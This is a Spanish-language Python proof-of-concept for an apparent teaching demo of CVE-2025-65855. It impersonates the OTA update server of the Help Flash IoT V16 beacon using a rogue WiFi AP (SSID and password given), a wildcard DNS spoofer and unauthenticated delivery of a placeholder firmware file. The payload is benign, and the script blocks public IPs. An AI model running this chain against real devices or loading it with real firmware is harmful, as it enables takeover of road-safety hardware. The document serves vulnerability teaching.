#!/usr/bin/env python3
"""
fake_ota_server.py — Servidor OTA falso para demo pedagógica
CVE-2025-65855 — Help Flash IoT: actualización firmware sin autenticación

Simula el servidor legítimo de actualizaciones de la baliza V16 Help Flash IoT
para demostrar en clase cómo un atacante puede instalar firmware malicioso en
menos de 60 segundos, sin abrir el dispositivo ni necesitar acceso previo.

LEGAL: Solo para uso sobre dispositivos propios, en entorno de laboratorio cerrado.
NO usar sobre dispositivos ajenos ni en redes no autorizadas.
Consultar el artículo original: https://github.com/LuisMirandaAcebedo/security_articles

Requisitos del sistema:
  - Linux (Ubuntu 22.04 / Kali)
  - Python 3.8+ (solo stdlib)
  - nmcli o hostapd para el AP WiFi (ver instrucciones en el doc de demo)
  - sudo si se usa --dns (puerto 53)

Uso:
  python3 fake_ota_server.py
  python3 fake_ota_server.py --host 192.168.x.x --port 8080
  sudo python3 fake_ota_server.py --dns          # activa también DNS wildcard
  python3 fake_ota_server.py --verbose            # muestra cabeceras HTTP

Pasos para la demo completa:
  1. Crear AP WiFi con SSID y contraseña: HF-UpdateAP-5JvqFV
  2. Ejecutar este script (con --dns si no hay otro servidor DNS en la red)
  3. Mantener pulsado el botón de la baliza 8 segundos
  4. Observar las conexiones en el log de este servidor
"""

import argparse
import http.server
import json
import os
import signal
import socket
import struct
import sys
import threading
import time


# ---------------------------------------------------------------------------
# Configuración
# ---------------------------------------------------------------------------

BANNER = r"""
╔══════════════════════════════════════════════════════════════╗
║        SERVIDOR OTA FALSO — DEMO PEDAGÓGICA                  ║
║        CVE-2025-65855 · Help Flash IoT                       ║
║        SOLO USO EN LABORATORIO SOBRE DISPOSITIVOS PROPIOS    ║
╚══════════════════════════════════════════════════════════════╝
"""

# Nombre del fichero de settings que busca el dispositivo real
SETTINGS_FILENAME = "settings_v18.json"

# Nombre del firmware "malicioso" (en la demo es completamente benigno)
FIRMWARE_FILENAME = "firmware_v99.bin"

# Contenido del firmware benign (sería código malicioso en un ataque real)
FIRMWARE_PAYLOAD = b"""
##################################################################
#  FIRMWARE DEMO  — CVE-2025-65855                              #
#  Este fichero es BENIGNO y sirve solo como prueba de concepto #
#  En un ataque real, aqui iria codigo ejecutable malicioso     #
#  que daría al atacante control total del dispositivo          #
##################################################################

[DEMO] Firmware descargado con éxito desde el servidor falso.
[DEMO] El dispositivo aceptó la actualización sin verificar:
  - Identidad del servidor
  - Firma digital del firmware
  - Certificado TLS (no existe: HTTP plano)
  - Integridad del contenido

[CVE-2025-65855] Investigador original: Luis Miranda Acebedo
[REF] https://github.com/LuisMirandaAcebedo/security_articles

Timestamp: DEMO_TIMESTAMP
"""


# ---------------------------------------------------------------------------
# Colores para la consola
# ---------------------------------------------------------------------------

class C:
    RESET  = "\033[0m"
    BOLD   = "\033[1m"
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    GRAY   = "\033[90m"


def ts() -> str:
    return time.strftime("%H:%M:%S")


def log(level: str, msg: str, color: str = C.RESET):
    print(f"{C.GRAY}[{ts()}]{C.RESET} {color}{C.BOLD}[{level}]{C.RESET} {msg}")


# ---------------------------------------------------------------------------
# Servidor HTTP malicioso
# ---------------------------------------------------------------------------

class OTAHandler(http.server.BaseHTTPRequestHandler):
    server_version = "HelpFlash-Update/1.8"
    sys_version = ""

    def __init__(self, *args, host_ip: str = "127.0.0.1",
                 port: int = 8080, verbose: bool = False, **kwargs):
        self.host_ip = host_ip
        self.http_port = port
        self.verbose = verbose
        super().__init__(*args, **kwargs)

    def log_message(self, fmt, *args):
        # Suprimir log por defecto — usamos el nuestro
        pass

    def do_GET(self):
        path = self.path.split("?")[0].lstrip("/")

        if SETTINGS_FILENAME in path:
            self._serve_settings()
        elif FIRMWARE_FILENAME in path or path.startswith("update/"):
            self._serve_firmware()
        else:
            self._serve_404(path)

    def _serve_settings(self):
        firmware_url = f"http://{self.host_ip}:{self.http_port}/update/{FIRMWARE_FILENAME}"

        # Formato plausible basado en el artículo de investigación (CVE-2025-65855)
        settings = {
            "version": "99.0.0",
            "release": "2026-01-01",
            "firmware_url": firmware_url,
            "firmware_size": len(FIRMWARE_PAYLOAD),
            "release_notes": "Critical mandatory update",
            "force_update": True,
            "checksum": "DEMO_NO_VERIFICATION_NEEDED",
        }
        body = json.dumps(settings, indent=2).encode()

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

        log("HTTP", f"⬇  settings.json entregado a {self.client_address[0]}", C.YELLOW)
        log("HTTP", f"   → firmware URL: {firmware_url}", C.YELLOW)
        if self.verbose:
            log("HTTP", f"   → payload: {body.decode()}", C.GRAY)

    def _serve_firmware(self):
        payload = FIRMWARE_PAYLOAD.replace(
            b"DEMO_TIMESTAMP", time.strftime("%Y-%m-%d %H:%M:%S").encode()
        )

        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Disposition",
                         f'attachment; filename="{FIRMWARE_FILENAME}"')
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

        log("HTTP", f"🚨 FIRMWARE MALICIOSO entregado a {self.client_address[0]}",
            C.RED)
        log("HTTP", f"   → {len(payload)} bytes transferidos sin autenticación",
            C.RED)
        log("HTTP",  "   → El dispositivo se reiniciará con el firmware comprometido",
            C.RED)

    def _serve_404(self, path: str):
        body = b"Not found"
        self.send_response(404)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
        log("HTTP", f"404 → /{path} desde {self.client_address[0]}", C.GRAY)


def make_handler(host_ip: str, port: int, verbose: bool):
    """Factory para inyectar parámetros en el handler."""
    def handler(*args, **kwargs):
        OTAHandler(*args, host_ip=host_ip, port=port, verbose=verbose, **kwargs)
    return handler


# ---------------------------------------------------------------------------
# Servidor DNS wildcard (opcional, requiere sudo)
# ---------------------------------------------------------------------------

class WildcardDNS:
    """
    Servidor DNS UDP mínimo que responde a todas las consultas A con una IP fija.
    No usa dependencias externas — solo stdlib.

    Protocolo DNS simplificado:
      - Parsea el Transaction ID y copia la sección Question
      - Devuelve una respuesta con un único Answer record apuntando a target_ip
    """

    def __init__(self, target_ip: str, port: int = 53):
        self.target_ip = target_ip
        self.port = port
        self._sock: socket.socket | None = None
        self._thread: threading.Thread | None = None
        self._running = False

    def start(self):
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._sock.bind(("0.0.0.0", self.port))
            self._sock.settimeout(1.0)
        except PermissionError:
            log("DNS", f"Puerto {self.port} requiere sudo. Lanzar con: sudo python3 fake_ota_server.py --dns", C.RED)
            sys.exit(1)
        except OSError as e:
            log("DNS", f"No se puede escuchar en puerto {self.port}: {e}", C.RED)
            sys.exit(1)

        self._running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()
        log("DNS", f"Servidor DNS wildcard activo en 0.0.0.0:{self.port}", C.GREEN)
        log("DNS", f"Todos los hostnames → {self.target_ip}", C.GREEN)

    def _build_response(self, data: bytes) -> bytes | None:
        if len(data) < 12:
            return None
        tx_id   = data[:2]
        # Flags: QR=1, OPCODE=0, AA=1, TC=0, RD=1, RA=1 → 0x8580
        flags   = b"\x85\x80"
        # QDCOUNT=1, ANCOUNT=1, NSCOUNT=0, ARCOUNT=0
        counts  = b"\x00\x01\x00\x01\x00\x00\x00\x00"
        question = data[12:]  # copiar sección question completa

        # Answer record con pointer a la question name
        ip_bytes = bytes(int(x) for x in self.target_ip.split("."))
        answer = (
            b"\xc0\x0c"          # pointer a nombre en question
            + b"\x00\x01"        # type A
            + b"\x00\x01"        # class IN
            + b"\x00\x00\x00\x3c"  # TTL 60 s
            + b"\x00\x04"        # rdlength 4
            + ip_bytes
        )
        return tx_id + flags + counts + question + answer

    def _loop(self):
        while self._running:
            try:
                data, addr = self._sock.recvfrom(512)
                response = self._build_response(data)
                if response:
                    self._sock.sendto(response, addr)
                    log("DNS", f"  Query desde {addr[0]} → {self.target_ip}", C.CYAN)
            except socket.timeout:
                continue
            except Exception:
                continue

    def stop(self):
        self._running = False
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass


# ---------------------------------------------------------------------------
# Detección de IP local
# ---------------------------------------------------------------------------

def get_local_ip() -> str:
    """Devuelve la IP local más probable (la que se usa para conectarse al exterior)."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"


# ---------------------------------------------------------------------------
# Punto de entrada
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Servidor OTA falso — demo CVE-2025-65855 (laboratorio)"
    )
    parser.add_argument("--host", default=None,
                        help="IP local del servidor (default: autodetectada)")
    parser.add_argument("--port", type=int, default=8080,
                        help="Puerto HTTP (default: 8080)")
    parser.add_argument("--dns", action="store_true",
                        help="Activar servidor DNS wildcard en puerto 53 (requiere sudo)")
    parser.add_argument("--verbose", action="store_true",
                        help="Mostrar contenido completo de las respuestas HTTP")
    args = parser.parse_args()

    host_ip = args.host or get_local_ip()

    # Validación de seguridad: rechazar si la IP es pública
    parts = host_ip.split(".")
    is_private = (
        parts[0] == "10"
        or (parts[0] == "172" and 16 <= int(parts[1]) <= 31)
        or (parts[0] == "192" and parts[1] == "168")
        or parts[0] == "127"
    )
    if not is_private:
        print(f"\n[ERROR] La IP detectada ({host_ip}) parece pública.")
        print("[ERROR] Este script solo debe usarse en redes privadas de laboratorio.")
        sys.exit(1)

    print(BANNER)
    log("INFO", f"IP del servidor  : {host_ip}", C.CYAN)
    log("INFO", f"Puerto HTTP      : {args.port}", C.CYAN)
    log("INFO", f"Settings URL     : http://{host_ip}:{args.port}/{SETTINGS_FILENAME}", C.CYAN)
    log("INFO", f"Firmware URL     : http://{host_ip}:{args.port}/update/{FIRMWARE_FILENAME}", C.CYAN)
    print()

    # Instrucciones para el AP WiFi
    log("SETUP", "Antes de continuar, asegúrate de haber creado el AP WiFi falso:", C.YELLOW)
    log("SETUP", f"  nmcli device wifi hotspot ifname wlan0 ssid 'HF-UpdateAP-5JvqFV' password 'HF-UpdateAP-5JvqFV'", C.YELLOW)
    log("SETUP", "  (ver 05_Demo_Vulnerabilidades_Help_Flash.md para más opciones)", C.YELLOW)
    print()

    # DNS opcional
    dns_server = None
    if args.dns:
        log("DNS", "Iniciando servidor DNS wildcard...", C.CYAN)
        dns_server = WildcardDNS(target_ip=host_ip)
        dns_server.start()
        print()

    # HTTP server
    handler = make_handler(host_ip, args.port, args.verbose)
    httpd = http.server.HTTPServer(("0.0.0.0", args.port), handler)

    log("HTTP", f"Servidor HTTP escuchando en 0.0.0.0:{args.port}", C.GREEN)
    log("HTTP", "Esperando conexión de la baliza...", C.GREEN)
    log("HTTP", "  → En la baliza: mantener pulsado el botón de encendido 8 segundos", C.GREEN)
    log("HTTP", "  → El dispositivo buscará la red WiFi 'HF-UpdateAP-5JvqFV' automáticamente", C.GREEN)
    print()
    log("INFO", "Ctrl+C para detener el servidor", C.GRAY)
    print()

    # Manejador de señales
    def shutdown(sig, frame):
        print()
        log("INFO", "Deteniendo servidor...", C.GRAY)
        threading.Thread(target=httpd.shutdown, daemon=True).start()
        if dns_server:
            dns_server.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)

    try:
        httpd.serve_forever()
    except Exception as e:
        log("ERROR", str(e), C.RED)
        sys.exit(1)


if __name__ == "__main__":
    main()
